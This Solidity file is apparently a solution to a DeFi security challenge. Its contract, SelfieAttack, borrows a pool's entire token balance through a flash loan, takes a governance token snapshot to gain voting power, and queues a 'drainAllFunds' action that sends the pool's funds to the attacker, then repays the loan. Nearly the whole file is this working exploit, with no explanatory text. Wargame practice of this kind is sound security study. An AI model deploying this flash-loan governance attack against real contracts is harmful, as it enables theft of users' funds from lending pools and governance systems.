pragma solidity 0.8.6;


interface ISelfiePool {

    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {

function queueAction(address receiver, bytes calldata data, uint256 weiAmount)  external;

}

interface IERC20 {

    function balanceOf(address account) external returns(uint256);
    function transfer(address reciepient,uint256 amount) external;
    function approve(address reciepient,uint256 amount) external;
    function snapshot() external;
}

contract SelfieAttack {

ISelfiePool selfie;
IERC20 token;
ISimpleGovernance govern;
address payable owner;
constructor(ISelfiePool _selfie,IERC20 _token,ISimpleGovernance _govern)  {

selfie = _selfie;
token = _token;
govern = _govern;
owner = payable(msg.sender);
}

function attack() external {


uint256 borrowAmount = token.balanceOf(address(selfie));

selfie.flashLoan(borrowAmount);

}


function receiveTokens(address,uint256 borrowAmount) external {
    require(token.balanceOf(address(this))== 1500000000000000000000000,"no enought tokens");
    // do your attack here before returning the tokens
    token.snapshot();
   govern.queueAction(address(selfie), abi.encodeWithSignature('drainAllFunds(address)',owner ), 0);

    token.transfer(address(selfie), borrowAmount);
}

}

